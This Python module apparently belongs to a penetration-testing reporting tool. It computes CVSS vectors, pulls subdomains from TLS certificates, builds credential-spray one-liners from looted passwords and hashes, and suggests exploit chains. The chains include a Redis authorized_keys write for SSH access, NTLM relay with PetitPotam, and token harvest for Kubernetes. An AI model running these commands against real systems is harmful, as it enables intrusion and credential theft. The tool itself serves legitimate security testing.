"""Report-time enrichment: CVSS auto-calc, cred-spray generator, subdomain
extraction from TLS SANs, finding correlation.

Everything here is derived from what's already in the datastore — no
external lookups, no bundled snapshot files (which would bloat the wheel
and drift out of date). Airgap-safe by construction.

The four capabilities:

* **cvss_vector(vuln)** — infer a CVSS 3.1 vector string from the
  finding's severity + CWEs + source. Not authoritative for CVE-tagged
  findings (real CVSS scores exist for those), but good enough for the
  many recce findings that don't map to a specific CVE.

* **extract_tls_sans(hosts)** — walk every host's TLS port evidence and
  pull Subject Alternative Names from certs. Produces a subdomain list
  purely from data we already collected during scanning, no external
  queries.

* **cred_spray_commands(hosts, credentials)** — for each discovered
  login form (from C2) plus each looted credential, generate the
  exact ready-to-run cred-spray one-liner. Also emits nxc commands
  for SMB / SSH / MSSQL when the credentials + hosts are present.

* **correlate(findings)** — surface exploit paths that emerge from
  finding combinations: exposed .git + PHP on same host = source
  disclosure route; unauth Redis + accessible SSH = SLAVEOF-to-authorized_keys
  RCE; open SMB signing disabled + kerberoastable admin = classic
  relay+dumping chain.
"""
from __future__ import annotations

import re
from typing import Iterable


# ---- CVSS auto-calc ---------------------------------------------------------

# Rough CVSS 3.1 vectors keyed by (source, severity). Not perfect, but a
# defensible starting point that saves the tester from writing "N/A" in
# every vector column of the report. Users override in the UI.
#
# Format: attack_vector/attack_complexity/privileges_required/user_interaction
#         /scope/confidentiality/integrity/availability
_BASE_VECTORS = {
    # HTTP path enum / disclosure: network, low complexity, no auth, no UI
    ("probe", "critical"): "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    ("probe", "high"):     "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
    ("probe", "medium"):   "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
    ("probe", "low"):      "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    ("probe", "info"):     "AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
    # Database findings: local network, likely PR:N when trust/default, C:H
    ("psql", "critical"):  "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    ("psql", "high"):      "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    ("mssql", "critical"): "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    ("mysql", "critical"): "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    # Loot findings: files already on-disk, PR:L (tester needs local access)
    ("loot", "critical"):  "AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
    ("loot", "high"):      "AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
}


def cvss_vector(vuln) -> str:
    """Infer a CVSS 3.1 base vector from a Vuln's (source, severity) pair.
    Returns the vector string ('AV:N/AC:L/…'); '' if no rule matches.
    Never returns a numeric score — leaves that to whoever consumes the
    vector (external calculator, spreadsheet macro, or none)."""
    src = (getattr(vuln, "source", "") or "").lower()
    sev = (getattr(vuln, "severity", "") or "").lower()
    return _BASE_VECTORS.get((src, sev), _BASE_VECTORS.get(("probe", sev), ""))


# ---- TLS SAN → subdomain enum -----------------------------------------------

_SAN_RE = re.compile(r"DNS:([A-Za-z0-9._*-]+)")


def extract_tls_sans(hosts: Iterable) -> dict[str, list[str]]:
    """Walk hosts, pull every DNS name from stored TLS certificate SANs
    (probes.tls_findings stashes them in the finding output text). Returns
    {host_ip: [sorted, deduped, lowercased dns names]}.

    Not an outbound lookup — reads only what's already in the datastore
    from prior TLS probes."""
    out: dict[str, list[str]] = {}
    for h in hosts:
        names: set[str] = set()
        for v in getattr(h, "vulns", None) or []:
            # tls_findings emits certificate CN + SAN in the output field.
            text = getattr(v, "output", "") or ""
            for m in _SAN_RE.finditer(text):
                name = m.group(1).strip().lower().lstrip("*.")
                if name and "." in name:
                    names.add(name)
        if names:
            out[h.ip] = sorted(names)
    return out


# ---- Cred-spray command generator -------------------------------------------

def cred_spray_commands(hosts: Iterable, credentials: Iterable) -> list[dict]:
    """For each combination of (credential, targetable service), emit a
    ready-to-run spray command. Returns list of
    {tool, service, target, command, credential_source}.

    Reads from what's already looted in the engagement — never guesses
    passwords, never generates any command that would sign in with a
    credential the tester hasn't collected."""
    creds = list(credentials or [])
    if not creds:
        return []
    hosts = list(hosts)

    # Build a fingerprint of open services across the fleet: which hosts
    # run SMB (445), SSH (22), MSSQL (1433), Postgres (5432), RDP (3389),
    # WinRM (5985/5986)?
    svc_targets: dict[str, list[str]] = {"smb": [], "ssh": [], "mssql": [],
                                          "postgres": [], "mysql": [], "rdp": [],
                                          "winrm": []}
    for h in hosts:
        for p in getattr(h, "open_ports", None) or []:
            if p.portid == 445 and h.ip not in svc_targets["smb"]:
                svc_targets["smb"].append(h.ip)
            elif p.portid == 22 and h.ip not in svc_targets["ssh"]:
                svc_targets["ssh"].append(h.ip)
            elif p.portid == 1433 and h.ip not in svc_targets["mssql"]:
                svc_targets["mssql"].append(h.ip)
            elif p.portid == 5432 and h.ip not in svc_targets["postgres"]:
                svc_targets["postgres"].append(h.ip)
            elif p.portid == 3306 and h.ip not in svc_targets["mysql"]:
                svc_targets["mysql"].append(h.ip)
            elif p.portid == 3389 and h.ip not in svc_targets["rdp"]:
                svc_targets["rdp"].append(h.ip)
            elif p.portid in (5985, 5986) and h.ip not in svc_targets["winrm"]:
                svc_targets["winrm"].append(h.ip)

    out: list[dict] = []
    for cred in creds:
        u = getattr(cred, "username", "") or ""
        sec = getattr(cred, "secret", "") or ""
        kind = (getattr(cred, "kind", "") or "").lower()
        if not u:
            continue
        # Skip obvious non-user creds
        if u.lower() in ("(embedded)", "(unknown)"):
            continue
        source = getattr(cred, "source", "") or "unknown"

        # nxc supports SMB / SSH / MSSQL / WinRM / RDP / LDAP with the same flag shape.
        if kind == "hash":
            hash_flag = "-H"                      # NT hash spray
            secret_arg = sec
        else:
            hash_flag = "-p"
            secret_arg = sec

        for svc, targets in svc_targets.items():
            if not targets:
                continue
            hosts_arg = ",".join(targets[:20])
            if len(targets) > 20:
                hosts_arg += f"  # (+{len(targets)-20} more)"
            if svc == "postgres":
                # nxc doesn't do postgres — hand the tester the psql loop
                out.append({
                    "tool": "psql",
                    "service": "postgres",
                    "targets": targets,
                    "command": (f"for ip in {' '.join(targets[:10])}; do "
                                f"PGPASSWORD='{sec}' psql -h $ip -U {u} -c '\\l' && "
                                f"echo \"HIT $ip\"; done"),
                    "credential_source": source,
                })
            elif svc == "mysql":
                out.append({
                    "tool": "mysql",
                    "service": "mysql",
                    "targets": targets,
                    "command": (f"for ip in {' '.join(targets[:10])}; do "
                                f"mysql -h $ip -u {u} -p'{sec}' -e 'SHOW DATABASES;' && "
                                f"echo \"HIT $ip\"; done"),
                    "credential_source": source,
                })
            else:
                out.append({
                    "tool": "nxc",
                    "service": svc,
                    "targets": targets,
                    "command": (f"nxc {svc} {hosts_arg} -u {u} {hash_flag} '{secret_arg}'"
                                + (" --local-auth" if svc == "smb" else "")),
                    "credential_source": source,
                })
    return out


# ---- Finding correlation ----------------------------------------------------

def correlate(hosts: Iterable) -> list[dict]:
    """Look for exploit-path patterns that emerge from combinations of
    findings on the same host or across the fleet. Each hit returns
    {title, severity, description, hosts:[ips], next_steps}.

    Correlations here are conservative — they only fire when both sides
    of the combination are actually present. False positives are worse
    than false negatives at the report stage."""
    hosts = list(hosts)
    out: list[dict] = []

    def _has(h, script_prefix: str) -> bool:
        return any((v.script_id or "").startswith(script_prefix)
                   for v in getattr(h, "vulns", None) or [])

    def _has_port(h, portid: int) -> bool:
        return any(p.portid == portid for p in getattr(h, "open_ports", None) or [])

    # 1. Exposed .git + PHP framework on same host = source-code+config disclosure
    for h in hosts:
        git_leak = any(v.script_id == "http-path-enum" and ".git" in (v.title or "")
                       for v in getattr(h, "vulns", None) or [])
        php_stack = any("PHP" in (v.output or "") or "PHPSESSID" in (v.output or "")
                        for v in getattr(h, "vulns", None) or []
                        if v.script_id == "http-fingerprint")
        if git_leak and php_stack:
            out.append({
                "title": "Git repo + PHP: full source + likely creds path",
                "severity": "critical",
                "hosts": [h.ip],
                "description": (f"{h.ip} exposes a .git directory AND fingerprints as PHP. "
                                f"Clone via git-dumper, then grep the source for hard-coded "
                                f"DB credentials in config.php / wp-config.php / .env — "
                                f"typical PHP apps embed them verbatim."),
                "next_steps": (f"git-dumper http://{h.ip}/.git /tmp/dump && "
                               f"grep -rE 'password|dbpass|api_key' /tmp/dump"),
            })

    # 2. Unauth Redis + open SSH on same host = SLAVEOF authorized_keys RCE
    for h in hosts:
        redis_unauth = any(v.script_id and "redis" in (v.script_id or "").lower()
                           and "unauth" in (v.title or "").lower()
                           for v in getattr(h, "vulns", None) or [])
        if redis_unauth and _has_port(h, 22):
            out.append({
                "title": "Unauth Redis + open SSH: authorized_keys RCE route",
                "severity": "critical",
                "hosts": [h.ip],
                "description": (f"{h.ip} exposes an unauthenticated Redis instance and "
                                f"SSH on 22. Classic authorized_keys write: SET a key "
                                f"whose value is a public SSH key, CONFIG SET dir "
                                f"/home/redis/.ssh, CONFIG SET dbfilename authorized_keys, "
                                f"SAVE — then ssh in as the redis service account."),
                "next_steps": (f"redis-cli -h {h.ip} config set dir /root/.ssh; "
                               f"redis-cli -h {h.ip} config set dbfilename authorized_keys; "
                               f"redis-cli -h {h.ip} set x \"\\n\\n$(cat ~/.ssh/id_rsa.pub)\\n\\n\"; "
                               f"redis-cli -h {h.ip} save; ssh redis@{h.ip}"),
            })

    # 3. Kerberoastable admin + open SMB without signing = relay-and-dump chain
    kerb_admins: list[str] = []
    for h in hosts:
        for v in getattr(h, "vulns", None) or []:
            if v.script_id == "kerberoast" and "admin" in (v.output or "").lower():
                kerb_admins.append(h.ip)
                break
    unsigned_smb: list[str] = []
    for h in hosts:
        for v in getattr(h, "vulns", None) or []:
            if "smb" in (v.script_id or "").lower() and "signing" in (v.title or "").lower():
                unsigned_smb.append(h.ip)
                break
    if kerb_admins and unsigned_smb:
        out.append({
            "title": "Kerberoastable admin + SMB signing disabled = coerce+relay chain",
            "severity": "high",
            "hosts": sorted(set(kerb_admins + unsigned_smb)),
            "description": (f"Fleet has BOTH a kerberoastable admin account (offline "
                            f"crackable TGS) AND at least one SMB host without signing. "
                            f"Coerced auth (PetitPotam / PrinterBug) from the SMB host can "
                            f"be relayed to a domain-joined LDAPS or ADCS endpoint for "
                            f"immediate privilege escalation, in parallel with the offline "
                            f"crack of the roasted admin's password."),
            "next_steps": ("ntlmrelayx.py -t ldaps://<dc> -smb2support --escalate-user <user>  "
                           "# in one terminal; petitpotam.py <coercer> <smb-victim>  "
                           "# in another"),
        })

    # 4. Exposed etcd or Consul on a k8s-adjacent segment = credential harvest
    k8s_ports = {6443, 10250, 10255}
    for h in hosts:
        etcd_unauth = _has(h, "etcd_unauth")
        consul_unauth = _has(h, "consul_unauth")
        has_k8s = any(_has_port(o, list(k8s_ports)[0]) for o in hosts)  # any host in fleet
        if (etcd_unauth or consul_unauth) and has_k8s:
            svc_name = "etcd" if etcd_unauth else "consul"
            out.append({
                "title": f"Unauth {svc_name} + k8s API in fleet = SA-token harvest",
                "severity": "critical",
                "hosts": [h.ip],
                "description": (f"{h.ip} exposes {svc_name} without auth, and a "
                                f"Kubernetes API endpoint is present elsewhere in the "
                                f"fleet. etcd/Consul on a k8s-adjacent segment typically "
                                f"stores the entire cluster's Secrets — ServiceAccount "
                                f"tokens, TLS material, image-pull creds — that then "
                                f"authenticate to the k8s API for full cluster takeover."),
                "next_steps": (f"# Dump {svc_name}; grep for -----BEGIN or eyJ tokens; "
                               f"then: kubectl --token=<harvested> --server=<k8s-api> get pods -A"),
            })

    return out
